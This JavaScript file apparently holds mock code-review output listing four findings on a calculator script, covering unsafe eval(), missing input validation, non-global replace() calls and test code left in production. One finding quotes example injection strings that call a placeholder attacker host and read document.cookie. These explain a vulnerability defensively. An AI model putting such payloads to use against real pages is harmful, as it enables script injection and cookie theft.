export const provisoryResponse = [
  {
    file: "00-Empregabilidade/01-projeto-calculadora/script.js",
    line: 36,
    severity: "critical",
    message:
      "Use of eval() with unsanitized user input. The visor.value content is passed directly to eval(), which can execute arbitrary JavaScript code. An attacker could manipulate the input field to run malicious scripts, leading to XSS or code injection attacks.",
    suggestion:
      "Replace eval() with a safe math expression parser such as a custom parser or a library like math.js. For example: use a regex to validate the expression only contains digits, operators, and decimal points before evaluating, or implement a proper expression evaluator without eval().",
  },
  {
    file: "00-Empregabilidade/01-projeto-calculadora/script.js",
    line: 36,
    severity: "warning",
    message:
      "No input validation or sanitization is performed on visor.value before passing it to eval(). Malicious strings like 'fetch(\"http://evil.com\")' or 'alert(document.cookie)' could be injected if the input source is not strictly controlled.",
    suggestion:
      "Add strict input validation using a whitelist regex before any evaluation. For example: if (!/^[0-9+\\-*/().\\s,]+$/.test(expression)) { visor.value = 'Erro'; return; }",
  },
  {
    file: "00-Empregabilidade/01-projeto-calculadora/script.js",
    line: 37,
    severity: "warning",
    message:
      "The replace() calls use string arguments instead of regex with the global flag, meaning only the first occurrence of ',' and '.' will be replaced. This can lead to incorrect calculation results for numbers with multiple decimal separators.",
    suggestion:
      "Use global regex replacements: visor.value.replace(/,/g, '.').replace(/÷/g, '/').replace(/×/g, '*') and similarly for the reverse replacement on line 37.",
  },
  {
    file: "00-Empregabilidade/01-projeto-calculadora/script.js",
    line: 75,
    severity: "suggestion",
    message:
      "The executarTestes() function is called automatically in production code and manipulates the DOM (visor.value). This could interfere with the application state when loaded in a browser and exposes internal logic.",
    suggestion:
      "Remove the executarTestes() call from production code or guard it with an environment check. Move tests to a separate test file or only run them in a development/test environment.",
  },
];
